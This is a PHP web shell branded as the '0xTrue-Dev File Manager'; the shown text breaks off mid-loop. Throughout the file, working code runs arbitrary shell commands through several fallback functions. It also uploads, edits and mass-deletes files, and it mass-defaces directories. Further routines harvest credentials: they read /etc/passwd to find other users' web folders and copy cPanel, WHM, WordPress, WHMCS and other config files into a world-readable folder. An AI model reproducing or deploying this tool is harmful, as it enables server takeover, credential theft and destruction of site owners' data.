<?php
// =================================================================
// KONFIGURASI & LOGIKA PHP
// =================================================================
set_time_limit(0);
error_reporting(0);
ignore_user_abort(true);

$initial_script_dir = getcwd(); // Store the original directory

// --- Keamanan Dasar ---
if (!isset($_SERVER['HTTP_USER_AGENT'])) {
    header('HTTP/1.0 403 Forbidden');
    die('<h1>403 Forbidden</h1>');
}

// --- Fungsi Bantuan ---
function getFileSize($bytes)
{
    if ($bytes === false || $bytes < 0) return 'N/A';
    if ($bytes === 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $index = floor(log($bytes, 1024));
    return round($bytes / (1024 ** $index), 2) . ' ' . $units[$index];
}

function executeCommand($cmd, $cwd)
{
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    $output = '';    // Change directory if specified    
    if ($cwd && is_dir($cwd)) {
        @chdir($cwd);
    }    // Handle 'cd' command separately    
    // Handle 'cd' command separately
    if (preg_match('/^cd\s*(.*)$/i', trim($cmd), $matches)) {
        global $initial_script_dir;
        $target_dir = trim($matches[1]);
        if (empty($target_dir)) {
            // If 'cd' is called without arguments, go to the initial script directory
            $target_dir = $initial_script_dir;
        }

        if (@chdir($target_dir)) {
            $new_path = getcwd();
            $output = "Changed directory to: " . $new_path;
        } else {
            $new_path = getcwd(); // Stay in the same directory on failure
            $output = "Failed to change directory to: " . htmlspecialchars($target_dir);
        }
        return ['output' => $output, 'new_path' => str_replace('\\', '/', $new_path)];
    }
    // For other commands, execute them    
    $full_cmd = $cmd . ' 2>&1';
    if (!in_array('shell_exec', $disabled)) {
        $output = @shell_exec($full_cmd);
    } elseif (!in_array('exec', $disabled)) {
        @exec($full_cmd, $o);
        $output = implode("\n", $o);
    } elseif (!in_array('system', $disabled)) {
        ob_start();
        @system($full_cmd);
        $output = ob_get_clean();
    } elseif (!in_array('passthru', $disabled)) {
        ob_start();
        @passthru($full_cmd);
        $output = ob_get_clean();
    } elseif (!in_array('popen', $disabled)) {
        $p = @popen($full_cmd, 'r');
        if ($p) {
            $o = '';
            while (!feof($p)) $o .= fread($p, 1024);
            pclose($p);
            $output = $o;
        }
    } else {
        $output = 'Execution failed: All available command execution functions are disabled.';
    }        // Always return the current working directory    
    return ['output' => $output, 'new_path' => str_replace('\\', '/', getcwd())];
}

function getFilePermissions($file)
{
    if (!file_exists($file)) return '---------';
    $perms = @fileperms($file);
    if ($perms === false) return '---------';
    $info = '';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function getFileOwner($file)
{
    if (!file_exists($file)) return '?';
    $ownerId = @fileowner($file);
    if ($ownerId === false) return '?';
    if (is_callable('posix_getpwuid')) {
        $ownerInfo = @posix_getpwuid($ownerId);
        return $ownerInfo ? $ownerInfo['name'] : $ownerId;
    }
    return $ownerId;
}

function getFileGroup($file)
{
    if (!file_exists($file)) return '?';
    $groupId = @filegroup($file);
    if ($groupId === false) return '?';
    if (is_callable('posix_getgrgid')) {
        $groupInfo = @posix_getgrgid($groupId);
        return $groupInfo ? $groupInfo['name'] : $groupId;
    }
    return $groupId;
}

function deleteDirectory($dirPath)
{
    if (!is_dir($dirPath)) return ['success' => false, 'message' => 'Path is not a directory.'];
    try {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dirPath, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($files as $fileinfo) {
            $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
            if (!@$todo($fileinfo->getRealPath())) return ['success' => false, 'message' => "Failed to delete {$fileinfo->getRealPath()}. Check permissions."];
        }
        if (@rmdir($dirPath)) return ['success' => true, 'message' => 'Directory deleted successfully.'];
        return ['success' => false, 'message' => 'Failed to delete the main directory.'];
    } catch (Exception $e) {
        return ['success' => false, 'message' => 'An error occurred: ' . $e->getMessage()];
    }
}

if (!function_exists('is_func_enabled')) {
    function is_func_enabled($func)
    {
        if (!function_exists($func)) return '<span class="badge bg-secondary">Not Exists</span>';
        $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
        return in_array($func, $disabled)
            ? '<span class="badge bg-danger">Disabled</span>'
            : '<span class="badge bg-success">Enabled</span>';
    }
}

if (!function_exists('get_ext_status')) {
    function get_ext_status($ext_name)
    {
        return extension_loaded($ext_name)
            ? '<span class="badge bg-success">Loaded</span>'
            : '<span class="badge bg-secondary">Not Loaded</span>';
    }
}

// --- Inisialisasi Variabel ---
$nick = "0xTrue-Dev";
$path = getcwd();
if (isset($_GET['path']) && !empty($_GET['path'])) {
    $tempPath = realpath($_GET['path']);
    if ($tempPath !== false && is_dir($tempPath)) {
        $path = $tempPath;
    }
}
$path = str_replace('\\', '/', $path);

// --- Penanganan Aksi (POST & AJAX) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    // =================================================
    // Penanganan Aksi AJAX (Return JSON)
    // =================================================
    $ajax_actions = ['executeCommand', 'findConfigs', 'findBackups', 'connectDb'];
    if (in_array($action, $ajax_actions)) {
        header('Content-Type: application/json');
        $response = ['success' => false, 'output' => 'Invalid AJAX action.'];

        switch ($action) {
            case 'executeCommand':
                if (isset($_POST['command'])) {
                    $result = executeCommand($_POST['command'], $_POST['cwd']); // Use $_POST['cwd'] here
                    $response = ['success' => true, 'output' => trim($result['output']), 'new_path' => $result['new_path']];
                } else {
                    $response['output'] = 'No command provided.';
                }
                break;

            case 'findConfigs':
                if (!empty($_POST['searchDir'])) {
                    $searchDir = realpath($_POST['searchDir']);
                    if ($searchDir && is_dir($searchDir)) {
                        $config_patterns = [
                            '*.config.php',
                            '*.inc.php',
                            '*.ini',
                            'config*.php',
                            'wp-config.php',
                            'settings.php',
                            'database.php',
                            '.env',
                            'config.json',
                            'credentials.json'
                        ];
                        $found_files = [];
                        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($searchDir, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($iterator as $file) {
                            if ($file->isFile()) {
                                foreach ($config_patterns as $pattern) {
                                    if (fnmatch($pattern, $file->getBasename())) {
                                        $found_files[] = $file->getRealPath();
                                        break;
                                    }
                                }
                            }
                        }
                        $response = ['success' => true, 'output' => !empty($found_files) ? implode("\n", $found_files) : 'No config files found.'];
                    } else {
                        $response['output'] = 'Search directory not found.';
                    }
                } else {
                    $response['output'] = 'Invalid request.';
                }
                break;

            case 'findBackups':
                if (!empty($_POST['searchDir'])) {
                    $searchDir = realpath($_POST['searchDir']);
                    if ($searchDir && is_dir($searchDir)) {
                        $backup_patterns = [
                            '*.bak',
                            '*.backup',
                            '*.old',
                            '*.zip',
                            '*.tar.gz',
                            '*.sql',
                            '*_backup.*'
                        ];
                        $found_files = [];
                        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($searchDir, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($iterator as $file) {
                            if ($file->isFile()) {
                                foreach ($backup_patterns as $pattern) {
                                    if (fnmatch($pattern, $file->getBasename())) {
                                        $found_files[] = $file->getRealPath();
                                        break;
                                    }
                                }
                            }
                        }
                        $response = ['success' => true, 'output' => !empty($found_files) ? implode("\n", $found_files) : 'No backup files found.'];
                    } else {
                        $response['output'] = 'Search directory not found.';
                    }
                } else {
                    $response['output'] = 'Invalid request.';
                }
                break;

            case 'connectDb':
                if (extension_loaded('mysqli')) {
                    $db_host = $_POST['db_host'] ?? '';
                    $db_user = $_POST['db_user'] ?? '';
                    $db_pass = $_POST['db_pass'] ?? '';
                    $db_name = $_POST['db_name'] ?? '';
                    $conn = @new mysqli($db_host, $db_user, $db_pass, $db_name);
                    if ($conn->connect_error) {
                        $response['output'] = "Connection failed: " . $conn->connect_error;
                    } else {
                        $result = $conn->query('SHOW TABLES');
                        $tables = [];
                        if ($result) {
                            while ($row = $result->fetch_array()) {
                                $tables[] = $row[0];
                            }
                        }
                        $conn->close();
                        $output = "Connection successful!\n\nDatabase: {$db_name}\nTables: " . (empty($tables) ? 'No tables found.' : implode(", ", $tables));
                        $response = ['success' => true, 'output' => $output];
                    }
                } else {
                    $response['output'] = 'MySQLi extension is not loaded.';
                }
                break;
        }

        echo json_encode($response);
        exit;
    }

    // =================================================
    // Penanganan Aksi Form Tradisional (Redirect)
    // =================================================
    $result = ['success' => false, 'message' => 'Unknown action.'];
    $redirect_path = urlencode($path);

    switch ($action) {
        case 'upload':
            if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
                if (move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . basename($_FILES['file']['name']))) {
                    $result = ['success' => true, 'message' => 'File uploaded successfully.'];
                } else {
                    $result['message'] = 'Upload failed. Check permissions.';
                }
            } else {
                $result['message'] = 'Upload error: ' . ($_FILES['file']['error'] ?? 'Unknown');
            }
            break;

        case 'createFile':
            if (!empty($_POST['fileName'])) {
                if (file_put_contents($path . '/' . basename($_POST['fileName']), $_POST['content'] ?? '') !== false) {
                    $result = ['success' => true, 'message' => 'File created successfully.'];
                } else {
                    $result['message'] = 'Failed to create file.';
                }
            } else {
                $result['message'] = 'File name is empty.';
            }
            break;

        case 'saveFile':
            if (!empty($_POST['filePath']) && isset($_POST['content'])) {
                $filePath = realpath($_POST['filePath']);
                if ($filePath && is_writable($filePath)) {
                    if (file_put_contents($filePath, $_POST['content']) !== false) {
                        $result = ['success' => true, 'message' => 'File saved successfully.'];
                    } else {
                        $result['message'] = 'Failed to save file.';
                    }
                } else {
                    $result['message'] = 'File is not writable or does not exist.';
                }
                $redirect_path = urlencode(dirname($filePath));
            } else {
                $result['message'] = 'Invalid request.';
            }
            break;

        case 'createFolder':
            if (!empty($_POST['folderName'])) {
                if (mkdir($path . '/' . basename($_POST['folderName']), 0755)) {
                    $result = ['success' => true, 'message' => 'Folder created successfully.'];
                } else {
                    $result['message'] = 'Failed to create folder.';
                }
            } else {
                $result['message'] = 'Folder name is empty.';
            }
            break;

        case 'rename':
            if (!empty($_POST['path']) && !empty($_POST['newName'])) {
                $oldPath = realpath($_POST['path']);
                if ($oldPath) {
                    $newPath = dirname($oldPath) . '/' . basename($_POST['newName']);
                    $redirect_path = urlencode(dirname($newPath));
                    if (rename($oldPath, $newPath)) {
                        $result = ['success' => true, 'message' => 'Renamed successfully.'];
                    } else {
                        $result['message'] = 'Failed to rename.';
                    }
                } else {
                    $result['message'] = 'Item not found.';
                }
            } else {
                $result['message'] = 'Invalid request.';
            }
            break;

        case 'delete':
            if (!empty($_POST['path'])) {
                $itemPath = realpath($_POST['path']);
                if ($itemPath) {
                    $redirect_path = urlencode(dirname($itemPath));
                    if ($_POST['type'] === 'dir') {
                        $result = deleteDirectory($itemPath);
                    } else {
                        if (unlink($itemPath)) {
                            $result = ['success' => true, 'message' => 'File deleted successfully.'];
                        } else {
                            $result['message'] = 'Failed to delete file.';
                        }
                    }
                } else {
                    $result['message'] = 'Item not found.';
                }
            } else {
                $result['message'] = 'Invalid request.';
            }
            break;

        case 'changePermissions':
            if (!empty($_POST['path']) && !empty($_POST['permissions'])) {
                if (chmod(realpath($_POST['path']), octdec($_POST['permissions']))) {
                    $result = ['success' => true, 'message' => 'Permissions changed successfully.'];
                } else {
                    $result['message'] = 'Failed to change permissions.';
                }
            } else {
                $result['message'] = 'Invalid request.';
            }
            break;

        case 'createSymlink':
            if (!empty($_POST['target']) && !empty($_POST['linkName'])) {
                $target = realpath($_POST['target']);
                $linkName = $path . '/' . basename($_POST['linkName']);
                if ($target) {
                    if (symlink($target, $linkName)) {
                        $result = ['success' => true, 'message' => 'Symlink created successfully.'];
                    } else {
                        $result['message'] = 'Failed to create symlink. Check permissions or if target exists.';
                    }
                } else {
                    $result['message'] = 'Target for symlink not found.';
                }
            } else {
                $result['message'] = 'Invalid request for symlink.';
            }
            break;

        case 'massDeface':
            if (!empty($_POST['targetDir']) && !empty($_POST['fileName']) && isset($_POST['content'])) {
                $targetDir = realpath($_POST['targetDir']);
                $fileName = basename($_POST['fileName']);
                $content = $_POST['content'];
                $recursive = isset($_POST['recursive']);
                $count = 0;
                if ($targetDir && is_dir($targetDir)) {
                    if (file_put_contents($targetDir . '/' . $fileName, $content) !== false) {
                        $count++;
                    }
                    if ($recursive) {
                        $directories = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($targetDir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($directories as $info) {
                            if ($info->isDir()) {
                                if (file_put_contents($info->getRealPath() . '/' . $fileName, $content) !== false) {
                                    $count++;
                                }
                            }
                        }
                    }
                    $result = ['success' => true, 'message' => "Mass deface complete. {$count} files created/modified."];
                } else {
                    $result['message'] = 'Target directory not found or is not a directory.';
                }
            } else {
                $result['message'] = 'Invalid request for mass deface.';
            }
            break;

        case 'massDelete':
            if (!empty($_POST['targetDir']) && !empty($_POST['fileName'])) {
                $targetDir = realpath($_POST['targetDir']);
                $fileNamePattern = $_POST['fileName'];
                $recursive = isset($_POST['recursive']);
                $count = 0;
                if ($targetDir && is_dir($targetDir)) {
                    $iterator = $recursive ? new RecursiveIteratorIterator(new RecursiveDirectoryIterator($targetDir, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) : new IteratorIterator(new DirectoryIterator($targetDir));
                    foreach ($iterator as $file) {
                        if ($file->isFile() && fnmatch($fileNamePattern, $file->getBasename())) {
                            if (unlink($file->getRealPath())) {
                                $count++;
                            }
                        }
                    }
                    $result = ['success' => true, 'message' => "Mass delete complete. {$count} files deleted."];
                } else {
                    $result['message'] = 'Target directory not found.';
                }
            } else {
                $result['message'] = 'Invalid request for mass delete.';
            }
            break;
    }

    $status_key = $result['success'] ? 'success' : 'error';
    header("Location: ?path={$redirect_path}&{$status_key}=1&message=" . urlencode($result['message']));
    exit;
}

// --- Penanganan AJAX untuk view file (dan fallback untuk direct access) ---
if (isset($_GET['filesrc'])) {
    $filepath = realpath($_GET['filesrc']);
    if ($filepath && is_file($filepath) && is_readable($filepath)) {
        header('Content-Type: text/plain; charset=UTF-8');
        readfile($filepath);
    } else {
        header('HTTP/1.0 404 Not Found');
        echo '404 Not Found. File may not exist or is not readable.';
    }
    exit;
}

if (isset($_GET['action']) && $_GET['action'] == 'serverInfo') {
    header('Content-Type: text/html');

    // --- General Info ---
    $info = '<h6 class="mt-3">General</h6><table class="table table-sm table-bordered table-striped"><tbody>';
    $info .= '<tr><th style="width: 30%;">Server Software</th><td>' . htmlspecialchars($_SERVER['SERVER_SOFTWARE']) . '</td></tr>';
    $info .= '<tr><th>Server IP / Name</th><td>' . htmlspecialchars($_SERVER['SERVER_ADDR']) . ' / ' . htmlspecialchars($_SERVER['SERVER_NAME']) . '</td></tr>';
    $info .= '<tr><th>Operating System</th><td>' . htmlspecialchars(php_uname()) . '</td></tr>';
    $info .= '<tr><th>Document Root</th><td>' . htmlspecialchars($_SERVER['DOCUMENT_ROOT']) . '</td></tr>';
    $info .= '</tbody></table>';

    // --- PHP Info ---
    $info .= '<h6 class="mt-3">PHP Environment</h6><table class="table table-sm table-bordered table-striped"><tbody>';
    $info .= '<tr><th style="width: 30%;">PHP Version</th><td>' . htmlspecialchars(phpversion()) . '</td></tr>';
    $info .= '<tr><th>Server API</th><td>' . htmlspecialchars(php_sapi_name()) . '</td></tr>';
    $info .= '<tr><th>Current User</th><td>' . htmlspecialchars(get_current_user()) . ' (UID: ' . getmyuid() . ', GID: ' . getmygid() . ')</td></tr>';
    $info .= '<tr><th>Memory Limit</th><td>' . htmlspecialchars(ini_get('memory_limit')) . '</td></tr>';
    $info .= '<tr><th>Max Execution Time</th><td>' . htmlspecialchars(ini_get('max_execution_time')) . 's</td></tr>';
    $info .= '<tr><th>Upload Max Filesize</th><td>' . htmlspecialchars(ini_get('upload_max_filesize')) . '</td></tr>';
    $info .= '<tr><th>Post Max Size</th><td>' . htmlspecialchars(ini_get('post_max_size')) . '</td></tr>';
    $open_basedir = ini_get('open_basedir');
    $info .= '<tr><th>Open Basedir</th><td>' . ($open_basedir ? '<span class="text-warning">' . htmlspecialchars($open_basedir) . '</span>' : '<span class="text-success">Off</span>') . '</td></tr>';
    $disabled_functions = ini_get('disable_functions');
    $info .= '<tr><th>Disabled Functions</th><td class="word-break" style="font-size: 0.8em;">' . ($disabled_functions ? htmlspecialchars($disabled_functions) : 'None') . '</td></tr>';
    $info .= '</tbody></table>';

    // --- Command Execution ---
    $info .= '<h6 class="mt-3">Command Execution</h6><table class="table table-sm table-bordered table-striped"><tbody>';
    $info .= '<tr><th style="width: 30%;">shell_exec</th><td>' . is_func_enabled('shell_exec') . '</td></tr>';
    $info .= '<tr><th>exec</th><td>' . is_func_enabled('exec') . '</td></tr>';
    $info .= '<tr><th>system</th><td>' . is_func_enabled('system') . '</td></tr>';
    $info .= '<tr><th>passthru</th><td>' . is_func_enabled('passthru') . '</td></tr>';
    $info .= '<tr><th>popen</th><td>' . is_func_enabled('popen') . '</td></tr>';
    $info .= '<tr><th>proc_open</th><td>' . is_func_enabled('proc_open') . '</td></tr>';
    $info .= '</tbody></table>';

    // --- Common Extensions ---
    $info .= '<h6 class="mt-3">PHP Extensions</h6><table class="table table-sm table-bordered table-striped"><tbody>';
    $info .= '<tr><th style="width: 30%;">MySQLi</th><td>' . get_ext_status('mysqli') . '</td></tr>';
    $info .= '<tr><th>PDO MySQL</th><td>' . get_ext_status('pdo_mysql') . '</td></tr>';
    $info .= '<tr><th>cURL</th><td>' . get_ext_status('curl') . '</td></tr>';
    $info .= '<tr><th>JSON</th><td>' . get_ext_status('json') . '</td></tr>';
    $info .= '<tr><th>GD Graphics</th><td>' . get_ext_status('gd') . '</td></tr>';
    $info .= '<tr><th>ImageMagick</th><td>' . get_ext_status('imagick') . '</td></tr>';
    $info .= '<tr><th>Zip</th><td>' . get_ext_status('zip') . '</td></tr>';
    $info .= '<tr><th>OpenSSL</th><td>' . get_ext_status('openssl') . '</td></tr>';
    $info .= '</tbody></table>';

    echo $info;
    exit;
}

// --- Data untuk Tampilan ---
$disk_total = @disk_total_space($path) ?: 1;
$disk_free = @disk_free_space($path) ?: 0;
$disk_used = $disk_total - $disk_free;
$disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) : 0;
?>
<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($nick); ?> - File Manager</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 384 512'><path d='M40.1 467.1l-11.2 9c-3.2 2.5-7.1 3.9-11.1 3.9C8 480 0 472 0 462.2L0 192C0 86 86 0 192 0S384 86 384 192l0 270.2c0 9.8-8 17.8-17.8 17.8c-4 0-7.9-1.4-11.1-3.9l-11.2-9c-13.4-10.7-32.8-9-44.1 3.9L269.3 506c-3.3 3.8-8.2 6-13.3 6s-9.9-2.2-13.3-6l-26.6-30.5c-12.7-14.6-35.4-14.6-48.2 0L141.3 506c-3.3 3.8-8.2 6-13.3 6s-9.9-2.2-13.3-6L84.2 471c-11.3-12.9-30.7-14.6-44.1-3.9zM160 192a32 32 0 1 0 -64 0 32 32 0 1 0 64 0zm96 32a32 32 0 1 0 0-64 32 32 0 1 0 0 64z'/></svg>" type="image/svg+xml">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        .table-hover tbody tr:hover {
            background-color: rgba(255, 255, 255, 0.075);
        }

        .breadcrumb-item a,
        .table a {
            text-decoration: none;
        }

        .btn-action {
            background: transparent;
            border: none;
            padding: 0.2rem 0.4rem;
        }

        .terminal {
            background-color: #000;
            font-family: 'Courier New', Courier, monospace;
            color: #0f0;
            height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
        }

        .code-editor {
            font-family: 'Courier New', Courier, monospace;
        }

        .word-break {
            word-break: break-all;
        }

        .view-content {
            max-height: 70vh;
            overflow-y: auto;
            background-color: #000;
        }

        .info-box {
            background-color: #212529;
            border: 1px solid #495057;
            border-radius: 0.25rem;
            padding: 1rem;
            margin-top: 1rem;
            font-family: 'Courier New', Courier, monospace;
            color: #f8f9fa;
        }

        .info-box pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            margin: 0;
        }

        .info-box .success {
            color: #28a745;
        }

        .info-box .error {
            color: #dc3545;
        }

        .info-box .warning {
            color: #ffc107;
        }

        .info-box a {
            color: #0d6efd;
        }

        .info-box table {
            width: 100%;
            border-collapse: collapse;
        }

        .info-box table th,
        .info-box table td {
            border: 1px solid #495057;
            padding: 0.5rem;
            text-align: left;
        }

        .info-box table th {
            background-color: #343a40;
        }
    </style>
</head>

<body>
    <div class="toast-container position-fixed top-0 end-0 p-3" style="z-index: 1100">
        <div id="notificationToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
            <div class="toast-header">
                <i id="toast-icon" class="fas fa-check-circle me-2"></i>
                <strong class="me-auto" id="toast-title"></strong>
                <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
            </div>
            <div class="toast-body" id="toast-body"></div>
        </div>
    </div>

    <div class="container my-4">
        <header class="text-center p-4 mb-4 bg-body-tertiary border rounded-3">
            <h1><i class="fas fa-ghost me-3"></i><?php echo htmlspecialchars($nick); ?> File Manager</h1>
        </header>

        <main>
            <div class="card bg-body-tertiary border mb-4">
                <div class="card-body">
                    <nav aria-label="breadcrumb">
                        <ol class="breadcrumb">
                            <li class="breadcrumb-item"><a href="?path=/"><i class="fas fa-home"></i></a></li>
                            <?php
                            $path_parts = explode('/', trim($path, '/'));
                            $cumulativePath = '';
                            foreach ($path_parts as $part) {
                                if (empty($part)) continue;
                                $cumulativePath .= '/' . $part;
                                echo '<li class="breadcrumb-item"><a href="?path=' . urlencode($cumulativePath) . '">' . htmlspecialchars($part) . '</a></li>';
                            }
                            ?>
                        </ol>
                    </nav>
                    <div class="d-flex flex-wrap gap-2">
                        <a href="?" class="btn btn-sm btn-outline-light" href="?" class="btn">Home</a>
                        <button class="btn btn-sm btn-primary" data-bs-toggle="modal" data-bs-target="#uploadModal"><i class="fas fa-upload me-1"></i>Upload</button>
                        <button class="btn btn-sm btn-success" data-bs-toggle="modal" data-bs-target="#newFileModal"><i class="fas fa-file me-1"></i>New File</button>
                        <button class="btn btn-sm btn-info" data-bs-toggle="modal" data-bs-target="#newFolderModal"><i class="fas fa-folder-plus me-1"></i>New Folder</button>
                        <button class="btn btn-danger" data-bs-toggle="modal" data-bs-target="#massToolsModal"><i class="fas fa-tools"></i> Mass Tools</button>
                        <button class="btn btn-sm btn-warning text-dark" data-bs-toggle="modal" data-bs-target="#commandModal"><i class="fas fa-terminal me-1"></i>Terminal</button>
                        <a href="?path=<?php echo urlencode($path); ?>&action=jumping" class="btn btn-sm btn-outline-light"><i class="fas fa-person-booth me-1"></i>Jumping</a>
                        <a href="?path=<?php echo urlencode($path); ?>&action=config" class="btn btn-sm btn-outline-primary"><i class="fas fa-cogs me-1"></i>Config</a>
                        <a href="?path=<?php echo urlencode($path); ?>&action=symlink" class="btn btn-sm btn-outline-info"><i class="fas fa-link me-1"></i>Symlink</a>
                        <button class="btn btn-secondary" data-bs-toggle="modal" data-bs-target="#serverInfoModal"><i class="fas fa-info-circle"></i> Server Info</button>
                    </div>
                    <div class="mt-3">
                        <div class="d-flex justify-content-between small">
                            <span>Disk Usage</span><span><?php echo $disk_used_percent; ?>%</span>
                        </div>
                        <div class="progress" style="height: 5px;">
                            <div class="progress-bar" role="progressbar" style="width: <?php echo $disk_used_percent; ?>%;"></div>
                        </div>
                        <div class="d-flex justify-content-between small text-muted mt-1">
                            <span><?php echo getFileSize($disk_used); ?> of <?php echo getFileSize($disk_total); ?></span>
                            <span>Free: <?php echo getFileSize($disk_free); ?></span>
                        </div>
                    </div>
                </div>
            </div>

            <?php
            $action = $_GET['action'] ?? '';
            if ($action == 'jumping' || $action == 'config' || $action == 'symlink') {
                if ($action == 'jumping') {
                    $i = 0;
                    echo '<div class="info-box"><pre>';
                    $etc = @fopen("/etc/passwd", "r");

                    if (!$etc) {
                        echo '<span class="error">Cannot read /etc/passwd</span>';
                    } else {
                        while ($passwd = fgets($etc)) {
                            if ($passwd == '') continue;
                            preg_match_all('/(.*?):x:/', $passwd, $user_jumping);

                            foreach ($user_jumping[1] as $user_jefri_jump) {
                                $user_jumping_dir = "/home/$user_jefri_jump/public_html";
                                if (is_readable($user_jumping_dir)) {
                                    $i++;
                                    $jrw = "[<span class='success'>R</span>] <a href='?path=" . urlencode($user_jumping_dir) . "' class='dir-row'>$user_jumping_dir</a>";
                                    if (is_writable($user_jumping_dir)) {
                                        $jrw = "[<span class='success'>RW</span>] <a href='?path=" . urlencode($user_jumping_dir) . "' class='dir-row'>$user_jumping_dir</a>";
                                    }
                                    echo $jrw;

                                    if (function_exists('posix_getpwuid')) {
                                        $domain_jump = @file_get_contents("/etc/named.conf");
                                        if ($domain_jump == '') {
                                            echo " => (<span class='warning'>failed to get domain</span>)<br>";
                                        } else {
                                            preg_match_all("#var/named/(.*?).db#", $domain_jump, $domains_jump);
                                            foreach ($domains_jump[1] as $dj) {
                                                $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                                $user_jumping_url = $user_jumping_url['name'];
                                                if ($user_jumping_url == $user_jefri_jump) {
                                                    echo " => (<u>$dj</u>)<br>";
                                                    break;
                                                }
                                            }
                                        }
                                    } else {
                                        echo "<br>";
                                    }
                                }
                            }
                        }
                        fclose($etc);
                    }

                    if ($i > 0) {
                        echo "<br>Total $i directories found on " . htmlspecialchars(gethostbyname($_SERVER['HTTP_HOST']));
                    } else {
                        echo "<span class='error'>No accessible directories found</span>";
                    }

                    echo '</pre></div>';
                } elseif ($action == 'config') {
                    $etc = @fopen("/etc/passwd", "r");
                    $idx = @mkdir("{$nick}_CONFIG", 0777);
                    $isi_htc = "Options all\nRequire None\nSatisfy Any";
                    $htc = @fopen("{$nick}_CONFIG/.htaccess", "w");
                    @fwrite($htc, $isi_htc);

                    if (!$etc) {
                        echo '<div class="info-box error">Cannot read /etc/passwd</div>';
                    } else {
                        while ($passwd = fgets($etc)) {
                            if ($passwd == "") continue;
                            preg_match_all('/(.*?):x:/', $passwd, $user_config);

                            foreach ($user_config[1] as $user_3X0RC1ST) {
                                $user_config_dir = "/home/$user_3X0RC1ST/public_html/";
                                if (is_readable($user_config_dir)) {
                                    $grab_config = array(
                                        "/home/$user_3X0RC1ST/.my.cnf" => "cpanel",
                                        "/home/$user_3X0RC1ST/.accesshash" => "WHM-accesshash",
                                        "/home/$user_3X0RC1ST/public_html/vdo_config.php" => "Voodoo",
                                        "/home/$user_3X0RC1ST/public_html/bw-configs/config.ini" => "BosWeb",
                                        "/home/$user_3X0RC1ST/public_html/config/koneksi.php" => "Lokomedia",
                                        "/home/$user_3X0RC1ST/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                                        "/home/$user_3X0RC1ST/public_html/clientarea/configuration.php" => "WHMCS",
                                        "/home/$user_3X0RC1ST/public_html/whm/configuration.php" => "WHMCS",
                                        "/home/$user_3X0RC1ST/public_html/whmcs/configuration.php" => "WHMCS",
                                        "/home/$user_3X0RC1ST/public_html/forum/config.php" => "phpBB",
                                        "/home/$user_3X0RC1ST/public_html/sites/default/settings.php" => "Drupal",
                                        "/home/$user_3X0RC1ST/public_html/config/settings.inc.php" => "PrestaShop",
                                        "/home/$user_3X0RC1ST/public_html/app/etc/local.xml" => "Magento",
                                        "/home/$user_3X0RC1ST/public_html/joomla/configuration.php" => "Joomla",
                                        "/home/$user_3X0RC1ST/public_html/configuration.php" => "Joomla",
                                        "/home/$user_3X0RC1ST/public_html/wp/wp-config.php" => "WordPress",
                                        "/home/$user_3X0RC1ST/public_html/wordpress/wp-config.php" => "WordPress",
                                        "/home/$user_3X0RC1ST/public_html/wp-config.php" => "WordPress",
                                        "/home/$user_3X0RC1ST/public_html/admin/config.php" => "OpenCart",
                                        "/home/$user_3X0RC1ST/public_html/slconfig.php" => "Sitelok",
                                        "/home/$user_3X0RC1ST/public_html/application/config/database.php" => "Ellislab"
                                    );

                                    foreach ($grab_config as $config => $nama_config) {
                                        $ambil_config = @file_get_contents($config);
                                        if ($ambil_config != '') {
                                            $file_config = @fopen("{$nick}_CONFIG/$user_3X0RC1ST-$nama_config.txt", "w");
                                            @fputs($file_config, $ambil_config);
                                        }
